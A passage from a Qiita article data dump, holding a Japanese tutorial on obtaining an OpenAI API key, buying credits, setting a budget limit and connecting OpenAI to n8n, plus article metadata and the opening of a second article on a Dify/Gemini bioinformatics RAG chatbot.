srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Ff0ad602f-34c0-419a-90d5-31574fc7beaa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=80d9f9154ca2c0348b0b0163f47c3f98 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/f0ad602f-34c0-419a-90d5-31574fc7beaa.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"50:1-50:43\">・「Add payment details」をクリック</p>\n<p data-sourcepos=\"52:1-52:157\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F5d15ddbd-691f-4df4-b834-9bb7981a81ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=33b521590c170dc4c4a498403032ef7a\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F5d15ddbd-691f-4df4-b834-9bb7981a81ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=33b521590c170dc4c4a498403032ef7a\" alt=\"open_ai_platform_credit_limit_2_billi ng.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F5d15ddbd-691f-4df4-b834-9bb7981a81ab.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=f82f29eaa225b5b34f2564e39288317d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/5d15ddbd-691f-4df4-b834-9bb7981a81ab.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"54:1-54:62\">・支払い情報を入力し、「Continue」をクリック</p>\n<p data-sourcepos=\"56:1-56:160\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F010f801c-0592-4688-ba21-6393094fd1c9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5d32347b5f5189bba553b70a842b9d1a\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F010f801c-0592-4688-ba21-6393094fd1c9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=5d32347b5f5189bba553b70a842b9d1a\" alt=\"open_ai_platform_credit_limit_3_add_payment.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F010f801c-0592-4688-ba21-6393094fd1c9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=32c98e0868ff078570d8876428021014 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/010f801c-0592-4688-ba21-6393094fd1c9.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"59:1-61:74\">・以下の内容を入力し、「Continue」をクリック<br>\nInitial credit purchase：初回チャージする金額<br>\nWould you like to set up automatic recharge?：自動リチャージ設定</p>\n<p data-sourcepos=\"63:1-64:75\">自動リチャージ設定はクレジットが足りなくなった際に自動でチャージする金額の設定です。<br>\n自動でチャージしたくない場合はチェックを外します。</p>\n<p data-sourcepos=\"66:1-66:166\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F0672c4ab-c2c1-413c-a45d-fd0b6f81feac.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b2f7d7df0464dc81475b272804b86efe\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F0672c4ab-c2c1-413c-a45d-fd0b6f81feac.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b2f7d7df0464dc81475b272804b86efe\" alt=\"open_ai_platform_credit_limit_4_configure_payment.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F0672c4ab-c2c1-413c-a45d-fd0b6f81feac.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=01813ad4f0e8f7bb0412c212bc00d305 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/0672c4ab-c2c1-413c-a45d-fd0b6f81feac.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"68:1-69:48\">・「Comfirm payment」をクリック<br>\n「Payment successful!」が表示されればOK</p>\n<p data-sourcepos=\"71:1-71:164\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Ff7dc763a-e40a-46ff-98f3-9046b2172797.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b066f62d57f9fe3d02058fc756217480\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Ff7dc763a-e40a-46ff-98f3-9046b2172797.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b066f62d57f9fe3d02058fc756217480\" alt=\"open_ai_platform_credit_limit_5_payment_summary.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Ff7dc763a-e40a-46ff-98f3-9046b2172797.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=2a0d533ab7f997174e1b46be29dd72dd 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/f7dc763a-e40a-46ff-98f3-9046b2172797.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"73:1-73:34\">\n<span id=\"openaiの予算上限を設定\" class=\"fragment\"></span><a href=\"#openai%E3%81%AE%E4%BA%88%E7%AE%97%E4%B8%8A%E9%99%90%E3%82%92%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>OpenAIの予算上限を設定</h3>\n<p data-sourcepos=\"74:1-75:45\">・OpenAI Platformのlimitsの設定を開く<br>\n左メニューの「Limits」をクリック</p>\n<p data-sourcepos=\"77:1-77:158\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F3d428d58-170a-4eb1-9741-23a010a43857.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=028ba8dbdd8cd48ad16ea801ad1f72b3\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F3d428d58-170a-4eb1-9741-23a010a43857.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=028ba8dbdd8cd48ad16ea801ad1f72b3\" alt=\"open_ai_platform_credit_limit_6_1_limits .png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F3d428d58-170a-4eb1-9741-23a010a43857.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=69d47686d31eecb776dfab28a9b3d4ee 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/3d428d58-170a-4eb1-9741-23a010a43857.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"79:1-79:35\">・「Edit budget」をクリック</p>\n<p data-sourcepos=\"81:1-81:157\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F34bb97b3-cbbb-4eb4-a54a-6a713fb49ed3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e50d27f61bc24f781529b5928bbc8d62\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F34bb97b3-cbbb-4eb4-a54a-6a713fb49ed3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e50d27f61bc24f781529b5928bbc8d62\" alt=\"open_ai_platform_credit_limit_6_2_limits.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F34bb97b3-cbbb-4eb4-a54a-6a713fb49ed3.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=780d41ed4fac6c442380411e9b1d5613 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/34bb97b3-cbbb-4eb4-a54a-6a713fb49ed3.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"83:1-83:87\">・「Monthly budget」に毎月の予算上限額を入力し「Save」をクリック</p>\n<p data-sourcepos=\"85:1-85:160\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F7d1c3b66-b7e4-4fae-a684-c12201cc88d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=97b003d6aa10621966f0748f62636f06\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F7d1c3b66-b7e4-4fae-a684-c12201cc88d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=97b003d6aa10621966f0748f62636f06\" alt=\"open_ai_platform_credit_limit_7_edit_budget.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F7d1c3b66-b7e4-4fae-a684-c12201cc88d9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ef0ee8eb18226f94839c43a296820160 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/7d1c3b66-b7e4-4fae-a684-c12201cc88d9.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"87:1-87:36\">以上で上限設定完了です。</p>\n<h2 data-sourcepos=\"89:1-89:25\">\n<span id=\"n8nとchatgptの連携\" class=\"fragment\"></span><a href=\"#n8n%E3%81%A8chatgpt%E3%81%AE%E9%80%A3%E6%90%BA\"><i class=\"fa fa-link\"></i></a>n8nとchatGPTの連携</h2>\n<p data-sourcepos=\"91:1-91:84\">・n8nのワークフローで「OpenAI」と検索し、「OpenAI」をクリック</p>\n<p data-sourcepos=\"93:1-93:136\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F7f00b426-145e-458e-8cd8-b5af235b7f82.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9a0fac81d65e89c4639e7ad666b3e3cb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F7f00b426-145e-458e-8cd8-b5af235b7f82.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9a0fac81d65e89c4639e7ad666b3e3cb\" alt=\"1_n8n_search_openai.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F7f00b426-145e-458e-8cd8-b5af235b7f82.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=399f66100072379c14f02a7d3555e504 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/7f00b426-145e-458e-8cd8-b5af235b7f82.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"95:1-96:118\">・「Message a model」をクリック<br>\n今回は「Message a model」を選択していますが、各自使用したいActionsを選択で大丈夫です。</p>\n<p data-sourcepos=\"98:1-98:145\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F9ab50007-802d-44c0-83fd-c8e711d18b86.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=865d0abf22373131ec9a511789cb220c\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F9ab50007-802d-44c0-83fd-c8e711d18b86.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=865d0abf22373131ec9a511789cb220c\" alt=\"2_n8n_select_message_a_model.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F9ab50007-802d-44c0-83fd-c8e711d18b86.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=048697685088d380ee23ed552ac3f8e9 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/9ab50007-802d-44c0-83fd-c8e711d18b86.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"100:1-100:124\">・「Credential to connect with」＞「Select Credential」をクリックし、「Create new credential」をクリック</p>\n<p data-sourcepos=\"102:1-102:140\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F4f40088e-e7bc-47ea-b05c-951841d2f8d1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9372678144be5f7ab2b6a0ea6fb58f87\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F4f40088e-e7bc-47ea-b05c-951841d2f8d1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9372678144be5f7ab2b6a0ea6fb58f87\" alt=\"3_n8n_select_credential.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F4f40088e-e7bc-47ea-b05c-951841d2f8d1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=bd1d628ed3e75f12e95fc1bfb0378c0d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/4f40088e-e7bc-47ea-b05c-951841d2f8d1.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"104:1-105:59\">・メモしておいたAPI Keyを入力し、右上の「Save」をクリック<br>\n「Connection tested successfully」と表示されればOK</p>\n<p data-sourcepos=\"107:1-107:141\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fc5610823-566e-40fa-a565-a1f1cf8a9d27.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e4169d67314ba726ae866cc2cf604705\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fc5610823-566e-40fa-a565-a1f1cf8a9d27.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e4169d67314ba726ae866cc2cf604705\" alt=\"4_n8n_open_ai_connection.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fc5610823-566e-40fa-a565-a1f1cf8a9d27.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=224088f8316fc23c60b0e6178ffea237 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/c5610823-566e-40fa-a565-a1f1cf8a9d27.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"109:1-110:67\">以上でn8nとOpenAIの連携完了です。<br>\nChatGPTが使用できるようになっていると思います。</p>\n",
      "body": "n8nでOpenAI APIと連携し、ChatGPTを使用する手順\n\n:::note info\nn8nからChatGPTを使用するには2025年12月現在、無料ではできませんでした。\nOpenAI APIのクレジットを購入する必要があります。($5～)\n:::\n\n## OpenAI APIキーの取得\nOpenAIアカウントを作成し、APIキーを取得する。\n既に取得済みの場合はスキップ\n\n・OpenAI Platformにアクセス\nhttps://platform.openai.com/docs/overview\n\n・右上の「Sign up」から登録\n\n・Organization作成で名称と属性を設定\n\n![open_ai_platform_1_create_organization.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/640254e4-a54b-4b54-b12c-08e9fedb975a.png)\n\n・Organizationに招待する人がいれば招待\n\n・APIのキー名とプロジェクト名を設定\nn8nで使用しているのがわかる名称で良いと思います。\n\n![open_ai_platform_2_setting_api_key_name.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/e32ec9ba-3114-436f-bcd8-b817cac2ba50.png)\n\n・キーが表示されるのでメモしておく\n\n![open_ai_platform_3_get_api_key.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/75712b5d-7853-4af6-a923-0df57dd35da9.png)\n\n・クレジットの購入は「I'll buy credits later」をクリックし後ほど\n※ここで購入してもOK\n\n![open_ai_platform_4_purchase_credits.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/c4e06b6f-fab3-4f0c-948f-666a8ae7a47c.png)\n\n## OpenAIのクレジット購入と予算上限を設定\n現在は無料枠がなく、クレジットを購入しないと使用できないよう。\nクレジットの購入と使いすぎて料金が高くなってしまわないように予算の上限を設定します。\n\n### OpenAIのクレジット購入\n・OpenAI Platformのlimitsの設定を開く\n下記リンクから開けます。\nhttps://platform.openai.com/settings/organization/limits\n\n・「Buy credits」をクリック\n\n![open_ai_platform_credit_limit_1_limits.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/f0ad602f-34c0-419a-90d5-31574fc7beaa.png)\n\n・「Add payment details」をクリック\n\n![open_ai_platform_credit_limit_2_billi ng.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/5d15ddbd-691f-4df4-b834-9bb7981a81ab.png)\n\n・支払い情報を入力し、「Continue」をクリック\n\n![open_ai_platform_credit_limit_3_add_payment.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/010f801c-0592-4688-ba21-6393094fd1c9.png)\n\n\n・以下の内容を入力し、「Continue」をクリック\nInitial credit purchase：初回チャージする金額\nWould you like to set up automatic recharge?：自動リチャージ設定\n\n自動リチャージ設定はクレジットが足りなくなった際に自動でチャージする金額の設定です。\n自動でチャージしたくない場合はチェックを外します。\n\n![open_ai_platform_credit_limit_4_configure_payment.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/0672c4ab-c2c1-413c-a45d-fd0b6f81feac.png)\n\n・「Comfirm payment」をクリック\n「Payment successful!」が表示されればOK\n\n![open_ai_platform_credit_limit_5_payment_summary.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/f7dc763a-e40a-46ff-98f3-9046b2172797.png)\n\n### OpenAIの予算上限を設定\n・OpenAI Platformのlimitsの設定を開く\n左メニューの「Limits」をクリック\n\n![open_ai_platform_credit_limit_6_1_limits .png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/3d428d58-170a-4eb1-9741-23a010a43857.png)\n\n・「Edit budget」をクリック\n\n![open_ai_platform_credit_limit_6_2_limits.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/34bb97b3-cbbb-4eb4-a54a-6a713fb49ed3.png)\n\n・「Monthly budget」に毎月の予算上限額を入力し「Save」をクリック\n\n![open_ai_platform_credit_limit_7_edit_budget.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/7d1c3b66-b7e4-4fae-a684-c12201cc88d9.png)\n\n以上で上限設定完了です。\n\n## n8nとchatGPTの連携\n\n・n8nのワークフローで「OpenAI」と検索し、「OpenAI」をクリック\n\n![1_n8n_search_openai.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/7f00b426-145e-458e-8cd8-b5af235b7f82.png)\n\n・「Message a model」をクリック\n今回は「Message a model」を選択していますが、各自使用したいActionsを選択で大丈夫です。\n\n![2_n8n_select_message_a_model.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/9ab50007-802d-44c0-83fd-c8e711d18b86.png)\n\n・「Credential to connect with」＞「Select Credential」をクリックし、「Create new credential」をクリック\n\n![3_n8n_select_credential.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/4f40088e-e7bc-47ea-b05c-951841d2f8d1.png)\n\n・メモしておいたAPI Keyを入力し、右上の「Save」をクリック\n「Connection tested successfully」と表示されればOK\n\n![4_n8n_open_ai_connection.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/c5610823-566e-40fa-a565-a1f1cf8a9d27.png)\n\n以上でn8nとOpenAIの連携完了です。\nChatGPTが使用できるようになっていると思います。\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:10:34+09:00",
      "group": null,
      "id": "a678801042b7b2d2b8ee",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "OpenAI",
          "versions": []
        },
        {
          "name": "n8n",
          "versions": []
        },
        {
          "name": "ChatGPT",
          "versions": []
        }
      ],
      "title": "n8nでChatGPTを使用するためにOpenAIとの連携方法",
      "updated_at": "2025-12-09T14:10:34+09:00",
      "url": "https://qiita.com/efoatono/items/a678801042b7b2d2b8ee",
      "user": {
        "description": null,
        "facebook_id": null,
        "followees_count": 2,
        "followers_count": 0,
        "github_login_name": null,
        "id": "efoatono",
        "items_count": 3,
        "linkedin_id": null,
        "location": null,
        "name": "",
        "organization": null,
        "permanent_id": 4230449,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/4230449/3cb60bcafe706944e04c321587642573e12eea93/x_large.png?1764754208",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": null
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": "efoat",
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h1 data-sourcepos=\"1:1-1:138\">\n<span id=\"difyとgemini-llmを活用したバイオインフォマティクス向けragチャットボット構築とbigquery連携実装ガイド\" class=\"fragment\"></span><a href=\"#dify%E3%81%A8gemini-llm%E3%82%92%E6%B4%BB%E7%94%A8%E3%81%97%E3%81%9F%E3%83%90%E3%82%A4%E3%82%AA%E3%82%A4%E3%83%B3%E3%83%95%E3%82%A9%E3%83%9E%E3%83%86%E3%82%A3%E3%82%AF%E3%82%B9%E5%90%91%E3%81%91rag%E3%83%81%E3%83%A3%E3%83%83%E3%83%88%E3%83%9C%E3%83%83%E3%83%88%E6%A7%8B%E7%AF%89%E3%81%A8bigquery%E9%80%A3%E6%90%BA%E5%AE%9F%E8%A3%85%E3%82%AC%E3%82%A4%E3%83%89\"><i class=\"fa fa-link\"></i></a>DifyとGemini LLMを活用したバイオインフォマティクス向けRAGチャットボット構築とBigQuery連携実装ガイド</h1>\n<blockquote data-sourcepos=\"3:1-4:201\">\n<p data-sourcepos=\"3:3-4:201\"><strong>対象読者</strong><br>\nバイオインフォマティクス研究者・エンジニア、AIチャットボット開発者、クラウド技術者、Qiita記事自動投稿に関心のある中級以上のプログラマー</p>\n</blockquote>\n<blockquote data-sourcepos=\"6:1-13:95\">\n<p data-sourcepos=\"6:3-6:41\"><strong>動作確認環境 / 前提条件</strong></p>\n<ul data-sourcepos=\"7:3-13:95\">\n<li data-sourcepos=\"7:3-7:43\">OS: Ubuntu 22.04 LTS / macOS Monterey</li>\n<li data-sourcepos=\"8:3-8:22\">Python 3.9以上</li>\n<li data-sourcepos=\"9:3-9:43\">Google Cloud SDK最新バージョン</li>\n<li data-sourcepos=\"10:3-10:32\">BigQueryアクセス権限</li>\n<li data-sourcepos=\"11:3-11:49\">Difyアカウント（無料プラン可）</li>\n<li data-sourcepos=\"12:3-12:51\">Google Cloud Vertex AI Gemini LLM利用権限</li>\n<li data-sourcepos=\"13:3-13:95\">前提知識: Pythonプログラミング基礎、REST API利用経験、GCPの基本操作</li>\n</ul>\n</blockquote>\n<blockquote data-sourcepos=\"15:1-18:107\">\n<p data-sourcepos=\"15:3-15:41\"><strong>この記事で得られること</strong></p>\n<ol data-sourcepos=\"16:3-18:107\">\n<li data-sourcepos=\"16:3-16:110\">Difyノーコードプラットフォームでバイオ知識ナレッジベースを構築する手順</li>\n<li data-sourcepos=\"17:3-17:95\">PythonでのGemini LLM連携による埋め込み検索＋自然言語応答の実装例</li>\n<li data-sourcepos=\"18:3-18:107\">BigQueryでのチャットボットログ蓄積と分析基盤設計、Next.jsによるWeb最適化例</li>\n</ol>\n</blockquote>\n<hr data-sourcepos=\"20:1-21:0\">\n<h2 data-sourcepos=\"22:1-22:79\">\n<span id=\"-導入aiナレッジベースとragチャットボットの重要性\" class=\"fragment\"></span><a href=\"#-%E5%B0%8E%E5%85%A5ai%E3%83%8A%E3%83%AC%E3%83%83%E3%82%B8%E3%83%99%E3%83%BC%E3%82%B9%E3%81%A8rag%E3%83%81%E3%83%A3%E3%83%83%E3%83%88%E3%83%9C%E3%83%83%E3%83%88%E3%81%AE%E9%87%8D%E8%A6%81%E6%80%A7\"><i class=\"fa fa-link\"></i></a>🧭 導入：AIナレッジベースとRAGチャットボットの重要性</h2>\n<p data-sourcepos=\"24:1-24:373\">GEM Labの若手調査員として新大陸の未知生命の探索調査を進める中、「大量の研究論文や解析報告をどう効率的に活用・共有するか」が課題となりました。バイオインフォマティクス領域ではデータも知識も膨大で散逸しやすく、調査活動の迅速な意思決定に支障をきたします。</p>\n<p data-sourcepos=\"26:1-26:455\">こうした課題を解決してくれるのが、最新のAI大規模言語モデル（LLM）を用いた<strong>RAG（Retrieval-Augmented Generation）チャットボット</strong>です。RAGは知識検索機能を組み合わせLLMの生成力で自然言語応答を行います。特にDifyのようなノーコードプラットフォームと、Google CloudのGemini LLMの組み合わせは導入の敷居が低く、かつ高度な対話が可能です。</p>\n<p data-sourcepos=\"28:1-28:396\">本記事では、GEM Labの調査員の視点でバイオインフォマティクス特化型チャットボットの構築から、大規模評価ログの管理、WebUI最適化までの技術的ワークフローを具体的に紹介します。これにより、読者の皆さんにも自分の研究や事業に適用可能な汎用技術として習得できる内容としています。</p>\n<hr data-sourcepos=\"30:1-31:0\">\n<h2 data-sourcepos=\"32:1-32:88\">\n<span id=\"-トピックの概要difyとgemini-llmで実現するragチャットボット\" class=\"fragment\"></span><a href=\"#-%E3%83%88%E3%83%94%E3%83%83%E3%82%AF%E3%81%AE%E6%A6%82%E8%A6%81dify%E3%81%A8gemini-llm%E3%81%A7%E5%AE%9F%E7%8F%BE%E3%81%99%E3%82%8Brag%E3%83%81%E3%83%A3%E3%83%83%E3%83%88%E3%83%9C%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>📘 トピックの概要：DifyとGemini LLMで実現するRAGチャットボット</h2>\n<h3 data-sourcepos=\"34:1-34:38\">\n<span id=\"difyプラットフォームとは\" class=\"fragment\"></span><a href=\"#dify%E3%83%97%E3%83%A9%E3%83%83%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>Difyプラットフォームとは</h3>\n<p data-sourcepos=\"35:1-35:332\">Difyはノーコードで文章のチャンク分割・埋め込み検索を実現できるクラウドサービスです。大量文書を小さな情報単位に分割（チャンク化）し、意味的に近い情報を高速検索できます。GEM 